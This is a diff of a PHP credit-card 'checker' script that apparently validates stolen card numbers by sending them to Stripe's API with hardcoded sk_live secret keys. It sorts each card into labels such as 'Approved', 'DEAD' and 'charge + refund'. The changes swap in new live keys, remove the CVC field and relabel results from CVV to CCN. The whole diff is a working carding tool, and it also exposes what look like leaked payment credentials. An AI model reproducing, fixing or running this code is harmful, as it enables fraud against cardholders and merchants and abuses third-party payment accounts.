@@ -61,7 +61,8 @@ $postcode = $matches1[1][0];
 
 $skArray = array(
     
-    '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',
+    'sk_live_ORzMITwceCzT3EJGhxwwhZ35',
+    'sk_live_D8ys6GoFaESoZ4ihINzaZNo0',
 );
 
 if (isset($skArray)) { 
@@ -81,7 +82,7 @@ if (isset($skArray)) {
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
   curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=carolprogay&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
+  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=stowechk&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
    $result1 = curl_exec($ch);
   $s = json_decode($result1, true);
   
@@ -178,10 +179,10 @@ if(strpos($fim, '"type":"credit"') !== false) {
 /////////////////////////// [Card Response]  //////////////////////////
 
 if(strpos($result3, '"seller_message": "Payment complete."' )) {
-    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) Stowe charge + refund 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
+    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CCN) Stowe charge + refund 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 }
 elseif(strpos($result3,'"cvc_check": "pass"')){
-    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CHARGED BC 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
+    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CCN) CHARGED BC 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 
 }
 
@@ -193,7 +194,7 @@ elseif(strpos($result3, "generic_decline" )) {
     echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE GENERIC 3 Stowe」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 }
 elseif(strpos($result3, "insufficient_funds" )) {
-    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - INSUFFICIENT FUND3  Stowe)」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
+    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CCN - INSUFFICIENT FUND3  Stowe)」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 }
 
 elseif(strpos($result3, "fraudulent" )) {
